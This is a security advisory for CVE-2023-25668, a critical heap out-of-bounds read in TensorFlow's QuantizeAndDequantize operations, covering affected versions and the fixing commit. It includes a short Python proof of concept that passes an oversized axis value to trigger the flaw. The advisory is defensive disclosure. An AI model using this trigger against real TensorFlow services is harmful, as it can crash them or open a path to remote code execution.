# TensorFlow has a heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation

**GHSA**: GHSA-gw97-ff7c-9v96 | **CVE**: CVE-2023-25668 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-122, CWE-125

**Affected Packages**:
- **tensorflow** (pip): < 2.11.1
- **tensorflow-cpu** (pip): < 2.11.1
- **tensorflow-gpu** (pip): < 2.11.1

## Description

### Impact
Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
When axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.
Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
```python
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    								   input_min=[1.0],
    								   input_max=[10.0],
    								   signed_input=True,
    								   num_bits=1,
    								   range_given=True,
    								   round_mode='HALF_TO_EVEN',
    								   narrow_range=True,
    								   axis=0x7fffffff)
test()
```



### Patches
We have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.



